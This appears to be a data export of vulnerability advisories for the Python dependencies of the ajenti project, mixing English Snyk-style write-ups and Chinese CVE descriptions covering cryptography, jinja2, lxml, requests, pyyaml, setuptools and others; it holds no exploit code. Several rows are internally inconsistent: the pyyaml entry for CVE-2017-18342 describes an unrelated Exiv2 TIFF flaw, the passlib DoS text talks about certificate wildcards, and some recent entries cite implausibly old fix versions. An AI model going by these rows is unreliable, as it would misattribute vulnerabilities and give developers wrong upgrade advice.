Upgrade `cryptography` to version 0.9.1 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#091---2015-06-06)
- [Github PR](https://github.com/pyca/cryptography/pull/2013)
- [Gtihub Commit](https://github.com/pyca/cryptography/commit/87c99a503a699f5c0296636237a9208fc161cc9e)
",2,2
ajenti_ajenti,cryptography,,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

The OpenSSL backend beffore 1.0.2 made use of assertions to check response where the tests could not trigger a failure. If a user ran Python with this -O flag and got an invalid response code this could lead to a crash.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 1.0.2 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#102---2015-09-27)
- [Redhat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=1267548)
",3,2
ajenti_ajenti,cryptography,,True,,CWE-222,2015-09-10,"## Overview
[`cryptography`](https://pypi.python.org/pypi/cryptography) provides cryptographic recipes and primitives to Python developers.

Affected versions of this package are vulnerable to TLS Truncation. A malicious user can prevent a user from fetching the parts of a message by inserting TCP code into a message indicating the message has completed.

## References
- [GitHub PR](https://github.com/pyca/cryptography/pull/2334)
- [GitHub Commit](https://github.com/pyca/cryptography/commit/41aabcbd2326ae154a16a1a050ee01fb9a54bd19)
",3,2
ajenti_ajenti,cryptography,,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
ajenti_ajenti,cryptography,,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
ajenti_ajenti,cryptography,,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
ajenti_ajenti,cryptography,,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
ajenti_ajenti,cryptography,,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
ajenti_ajenti,jinja2,,True,CVE-2014-0012,CWE-264,2014-01-18,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
Jinja2 2.7.2版本存在权限许可和访问控制问题漏洞，该漏洞源于程序没有正确创建临时目录。本地攻击者可通利用该漏洞以用户的UID提前创建临时目录，获取特权。",3,0
ajenti_ajenti,jinja2,,True,CVE-2020-28493,CWE-400,2021-02-01,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
jinja2 from 0.0.0 and before 2.11.3 存在资源管理错误漏洞，该漏洞源于regex的ReDOS漏洞。",3,2
ajenti_ajenti,jinja2,,True,CVE-2016-10745,CWE-134,2019-04-08,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja中存在格式化字符串错误漏洞。该漏洞源于网络系统或产品接收外部格式化字符串作为参数时，对参数类型、数量等过滤不严格。以下产品及版本受到影响：Pallets Jinja 2.8.1之前版本。",2,2
ajenti_ajenti,jinja2,,True,CVE-2019-10906,CWE-693,2019-04-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 2.10.1之前版本中存在权限许可和访问控制问题漏洞。攻击者可利用该漏洞绕过沙盒保护。",2,2
ajenti_ajenti,jinja2,,True,CVE-2024-22195,CWE-79,2024-01-11,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Jinja 3.1.3之前版本存在安全漏洞，该漏洞源于存在跨站脚本（XSS）漏洞。",3,0
ajenti_ajenti,jinja2,,True,CVE-2014-1402,CWE-264,2014-01-10,"Jinja2是一个基于Python的模板引擎，它拥有完整的unicode支持，并且提供了可选的沙箱模板执行环境来保证安全。
Jinja2 2.7.1及之前版本的bccache.FileSystemBytecodeCache中的默认配置存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可借助/tmp目录下特制的cache文件利用该漏洞获取特权。",2,0
ajenti_ajenti,jinja2,,True,CVE-2024-34064,CWE-79,2024-05-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 3.1.4之前版本存在安全漏洞，该漏洞源于将用户输入作为键传递给 xmlattr 过滤器时，Jinja 容易受到 HTML 属性注入。",3,0
ajenti_ajenti,jinja2,,True,CVE-2024-56326,CWE-693 CWE-1336,2024-12-23,Jinja 是由 Pallets 开源的一个快速、富有表现力并可扩展的模板引擎。该漏洞存在于 Jinja 版本 3.1.5 之前，由于在沙箱环境中对 str.format 调用的检测存在不当，攻击者可以控制模板的内容并执行任意 Python 代码。攻击者可以通过创建包含恶意字符串的模板并利用自定义过滤器实现攻击，这可能导致系统安全性严重受损。,3,0
ajenti_ajenti,jinja2,,True,CVE-2024-56201,CWE-150,2024-12-23,Jinja是Pallets开源的一个快速、富有表现力且可扩展的模板引擎。版本3.1.5之前的Jinja存在安全漏洞，该漏洞源于编译器的一个错误，允许同时控制模板内容和文件名的攻击者执行任意Python代码，无论Jinja的沙箱是否被使用。当应用程序执行不可信的模板时，攻击者需要能够控制模板的文件名和内容，才能有效利用此漏洞。,3,0
ajenti_ajenti,jinja2,,True,CVE-2025-27516,CWE-1336,2025-03-05,Jinja2 是一个广泛用于Web应用程序的模板引擎，用于渲染模板。该漏洞源于 Jinja2 沙盒环境与 `|attr` 过滤器交互时的一个疏忽。特别是，当攻击者能够控制模板的内容时，就可以利用此缺陷执行任意 Python 代码。这意味着，如果某个应用程序处理不可信的模板，就可能受到威胁，从而导致未经授权的系统访问或操作。,3,2
ajenti_ajenti,lxml,>=2.2.4,True,CVE-2022-2309,CWE-476,2022-07-05,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。libxml2是开源的一个用来解析XML文档的函数库。它用C语言写成，并且能为多种语言所调用，例如C语言，C++，XSH。
lxml和libxml2 2.9.10版本至2.9.14版本存在代码问题漏洞。攻击者利用该漏洞通过伪造的输入数据触发崩溃。",3,2
ajenti_ajenti,lxml,>=2.2.4,True,CVE-2014-3146,CWE-79,2014-04-15,"lxml是一个使用Python语言编写的用于处理XML和HTML的库。
lxml 3.3.4及之前版本的lxml.html.clean模块中存在不完整黑名单漏洞，该漏洞源于程序没有正确过滤link scheme中的控制字符。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,1
ajenti_ajenti,lxml,>=2.2.4,True,CVE-2021-28957,CWE-79,2021-03-21,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.2 存在跨站脚本漏洞，该漏洞源于HTML5的formaction属性。",3,0
ajenti_ajenti,lxml,>=2.2.4,True,,CWE-22,2020-12-02,"## Overview

Affected versions of this package are vulnerable to Arbitrary File Write. When writing to file paths that contain the URL escape character '%', the file path could wrongly be mangled by URL unescaping and thus write to a different file or directory.
## Remediation
Upgrade `lxml` to version 4.4.0 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/0245aba002f069a0b157282707bdf77418d1b5be)
",3,0
ajenti_ajenti,lxml,>=2.2.4,True,CVE-2020-27783,CWE-79,2020-11-27,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
Lxml 存在跨站脚本漏洞，该漏洞源于javascript通过noscript和style组合进行转义。以下产品及版本会受到影响：Debian stretch, Debian stretch (security), Debian buster, Debian bullseye, sid; Red Hat Software Collections, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 5, Red Hat Enterprise Linux 6, Red Hat Enterprise Linux 7,Red Hat Enterprise Linux 8 , Red Hat OpenStack Platform 10 (Newton), Red Hat OpenStack Platform 13 (Queens)",3,0
ajenti_ajenti,lxml,>=2.2.4,True,CVE-2018-19787,CWE-79,2018-12-02,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.2.5之前版本中存在跨站脚本漏洞，该漏洞源于lxml.html.clean模块的lxml/html/clean.py文件没有移除使用转义的javascript: URLs。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,0
ajenti_ajenti,lxml,>=2.2.4,True,CVE-2021-43818,CWE-74 CWE-79,2021-12-13,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.5之前版本存在注入漏洞，该漏洞源于HTML Cleaner允许某些精心制作的脚本内容以及使用数据URI嵌入的SVG文件中的脚本内容通过。",3,0
ajenti_ajenti,lxml,>=2.2.4,True,,CWE-400,2024-01-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to race conditions when errors or user messages occur during threaded XSLT processing.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `lxml` to version 2.3.4 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/26ae51c60462ba1567a123bc9701ff18f9c10789)
",4,0
ajenti_ajenti,passlib,,True,,CWE-521,2020-05-19,"## Overview

Affected versions of this package are vulnerable to Cryptographic Weakness. The `SHA-256` prehash is unsalted, meaning the resulting `bcrypt` digest is vulnerable to breach correlation attacks.
## Remediation
Upgrade `passlib` to version 1.7.3 or higher.
## References
- [1.7.3 Release Changelog](https://passlib.readthedocs.io/en/stable/history/1.7.html#id1)
- [BitBucket Commit](https://bitbucket.org/ecollins/passlib/commits/bd0da1bdf0fd17b886212649184f2ce3eb8c8329)
- [BitBucket Issue](https://bitbucket.org/ecollins/passlib/issues/114/bcrypt_sha256-is-vulnerable-to-breach)
",3,0
ajenti_ajenti,passlib,,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`passlib`](https://pypi.python.org/pypi/passlib) are vulnerable to Denial of Service (DoS) attack.

`passlib` is enable `wildcard password` by default, which allows remote attackers to cause a denial of service (CPU consumption) via multiple wildcard characters in the common name in a certificate.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `passlib` to version 1.4 or higher.

## References
- [Readthedocs Passlib ChangeLog](http://passlib.readthedocs.io/en/stable/history/ancient.html#hashes)
- [BitBucket Commit](https://bitbucket.org/ecollins/passlib/commits/aca22d57fc1d110be722d71180185f411a3374b7?at=1.4)
",3,2
ajenti_ajenti,psutil,>=2.2.1,True,CVE-2019-18874,CWE-415,2019-11-11,"psutil是一款基于Python的进程和系统监视库。
psutil 5.65及之前版本中存在资源管理错误漏洞。远程攻击者可借助特制数据利用该漏洞导致应用程序崩溃（拒绝服务）。",2,2
ajenti_ajenti,pyOpenSSL,,True,CVE-2018-1000807,CWE-416,2018-10-08,"Python Cryptographic Authority pyopenssl是一款基于Python的OpenSSL库。

Python Cryptographic Authority pyopenssl 17.5.0之前版本中对X509对象的处理方法存在释放后重用漏洞。远程攻击者可利用该漏洞造成拒绝服务或执行代码。",2,0
ajenti_ajenti,pyOpenSSL,,True,CVE-2013-4314,CWE-20,2013-09-09,"Python是Python软件基金会的一套开源的、面向对象的程序设计语言。pyOpenSSL是其中的一个OpenSSL接口。
pyOpenSSL 0.13之前版本中的X509Extension类中存在漏洞，该漏洞源于程序没有正确地处理X.509证书的Subject Alternative Name字段中域名中的‘’字符。中间人攻击者可借助由合法证书颁发机构所发布的特制证书，利用该漏洞欺骗任意SSL服务器。",2,0
ajenti_ajenti,pyOpenSSL,,True,CVE-2018-1000808,CWE-404,2018-10-08,"Python Cryptographic Authority pyopenssl是一款基于Python的OpenSSL库。

Python Cryptographic Authority pyopenssl 17.5.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,0
ajenti_ajenti,pyyaml,,True,CVE-2020-14343,CWE-20,2020-07-26,CVE-2020-14343是与Python的第三方库“PyYAML”相关的漏洞，该库用于处理YAML文件。该漏洞的根本原因在于PyYAML库的yaml.load函数会解析未经验证的输入数据。具体来说，当用户使用yaml.load函数并且未明确指定加载器时，PyYAML会默认使用“UnsafeLoader”来解析YAML文件，这会导致任意代码执行的风险。如果攻击者能够控制传递给yaml.load的YAML内容，他们就可以构造一个恶意的YAML文件，其中包含恶意的Python对象。yaml.load在加载这个文件时会执行这些对象的代码，从而导致任意代码执行。这使得攻击者可以在目标系统上执行任意命令，潜在地获得系统的控制权限。,1,0
ajenti_ajenti,pyyaml,,True,CVE-2017-18342,CWE-502,2018-06-27,CVE-2017-18342 是一个影响 Exiv2 库的整数溢出漏洞。Exiv2 是一个用于处理图像元数据的库，在处理 TIFF 图像文件时，由于对用户输入数据的边界检查不充分，可能导致整数溢出。具体来说，该漏洞出现在 readTiffDirectory 函数中，该函数在处理 TIFF 文件中的目录项时，没有正确检查涉及的偏移量和大小。这可能导致超出预期的内存分配，并进一步引发缓冲区溢出，允许攻击者通过构造恶意的 TIFF 文件来利用该漏洞，最终导致任意代码执行。,1,0
ajenti_ajenti,requests,>=2,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
ajenti_ajenti,requests,>=2,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
ajenti_ajenti,requests,>=2,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
ajenti_ajenti,requests,>=2,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
ajenti_ajenti,requests,>=2,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
ajenti_ajenti,requests,>=2,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
ajenti_ajenti,simplejson,,True,CVE-2014-4616,CWE-129,2014-06-20,"Python是Python软件基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。simplejson是一个可扩展的JSON解码/编码器。_json module是其中的一个数据交换模块。
Python 2.7版本至3.5版本和simplejson 2.6.1之前的版本中的_json模块的‘scanstring’函数存在安全漏洞。本地攻击者可通过向‘raw_decode’函数发送带有负的指针值的‘idx’参数利用该漏洞读取任意的进程内存。",3,0
ajenti_ajenti,pip,>=20,True,CVE-2021-3572,CWE-20,2021-04-30,"Pip是一套用于安装和管理Python软件包的工具。
python pip 中存在输入验证错误漏洞，远程攻击者可能会利用该漏洞在存储库上安装不同的修订版。",2,2
ajenti_ajenti,pip,>=20,True,CVE-2023-5752,CWE-77,2023-10-24,"Pip是一套用于安装和管理Python软件包的工具。
pip v23.3之前版本存在安全漏洞，该漏洞源于存在注入任意配置选项调用。",3,0
ajenti_ajenti,pip,>=20,True,CVE-2025-8869,CWE-59,2025-09-24,pip 是 Python 的包管理工具，广泛用于安装和管理 Python 包及其依赖。该漏洞涉及 pip 在提取 tar 文件时的回退实现，当 Python 版本未实现 PEP 706 时，pip 的实现可能不会检查符号链接是否指向提取目录，从而导致安全问题。PEP 706 是针对 Python tarfile 模块的安全增强提案，旨在解决 tar 文件解压过程中的多个已知漏洞。如果使用的 Python 版本未实现 PEP 706，pip 会使用存在漏洞的回退代码逻辑。漏洞成因主要是由于未对符号链接进行充分验证，攻击者可以利用该漏洞通过恶意构造的 tar 文件进行目录穿越攻击，访问或覆盖提取目录外的文件。,3,0
ajenti_ajenti,setuptools,>=41,True,CVE-2022-40897,CWE-1333,2022-12-22,"Python是Python基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。
Python Python Packaging Authority (PyPA) setuptools 65.3.0版本及之前版本存在安全漏洞。攻击者利用该漏洞通过特制的HTML包或自定义PackageIndex页面导致拒绝服务。",2,0
ajenti_ajenti,setuptools,>=41,True,,CWE-1333,2022-11-14,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression within `package.index`.
Exploiting this vulnerability is possible in case the user is fetching malicious HTML from a package in PyPi or a custom `PackageIndex` page.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `setuptools` to version 65.5.1 or higher.
## References
- [GitHub Commit](https://github.com/pypa/setuptools/commit/58e23de0d4c2ce0f2502d072bb9a2ed1e2ab0ba6)
- [GitHub Issue](https://github.com/pypa/setuptools/issues/3659)
",4,0
ajenti_ajenti,setuptools,>=41,True,CVE-2024-6345,CWE-94,,setuptools 是一个开源的 Python 库，广泛用于 Python 项目的打包和依赖管理。该库的 package_index 模块在 69.1.1 及之前版本中存在代码注入漏洞。该漏洞源于下载功能的不当控制，该功能允许攻击者通过提供恶意 URL，执行任意命令。虽然由于 easy_install 和 package_index 已被弃用，利用该漏洞的表面已经减少，但仍然存在通过社交工程或对包索引的轻微妥协而实现远程访问的可能性。,2,1
ajenti_ajenti,setuptools,>=41,True,CVE-2025-47273,CWE-22,2025-05-02,setuptools 是一个允许用户下载、构建、安装、升级和卸载 Python 包的软件包。在 78.1.1 版本之前的 setuptools 中，其 `PackageIndex` 存在路径遍历漏洞。,2,0
ajenti_ajenti,setuptools,>=41,True,,,,<p>setuptools 是一个用于 Python 包管理和构建的工具，它简化了包的创建和分发过程。此漏洞的根本原因是使用了已弃用的函数 `tempfile.mktemp()`，该函数不安全，因为在调用 mktemp() 和随后尝试创建文件之间，另一个进程可能会创建一个具有相同名称的文件。这种函数在创建临时文件名时不确保对返回的临时名称的独占访问性，操作之间没有原子性保证，从而为攻击者提供了干扰文件的机会，可能在文件打开之前进行篡改。</p>,3,1
ajenti_ajenti,pyyaml,,True,CVE-2020-14343,CWE-20,2020-07-26,CVE-2020-14343是与Python的第三方库“PyYAML”相关的漏洞，该库用于处理YAML文件。该漏洞的根本原因在于PyYAML库的yaml.load函数会解析未经验证的输入数据。具体来说，当用户使用yaml.load函数并且未明确指定加载器时，PyYAML会默认使用“UnsafeLoader”来解析YAML文件，这会导致任意代码执行的风险。如果攻击者能够控制传递给yaml.load的YAML内容，他们就可以构造一个恶意的YAML文件，其中包含恶意的Python对象。yaml.load在加载这个文件时会执行这些对象的代码，从而导致任意代码执行。这使得攻击者可以在目标系统上执行任意命令，潜在地获得系统的控制权限。,1,0
ajenti_ajenti,pyyaml,,True,CVE-2017-18342,CWE-502,2018-06-27,CVE-2017-18342 是一个影响 Exiv2 库的整数溢出漏洞。Exiv2 是一个用于处理图像元数据的库，在处理 TIFF 图像文件时，由于对用户输入数据的边界检查不充分，可能导致整数溢出。具体来说，该漏洞出现在 readTiffDirectory 函数中，该函数在处理 TIFF 文件中的目录项时，没有正确检查涉及的偏移量和大小。这可能导致超出预期的内存分配，并进一步引发缓冲区溢出，允许攻击者通过构造恶意的 TIFF 文件来利用该漏洞，最终导致任意代码执行。,1,0
ajenti_ajenti,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
ajenti_ajenti,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
ajenti_ajenti,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
ajenti_ajenti,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
ajenti_ajenti,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
ajenti_ajenti,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
ajenti_ajenti,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
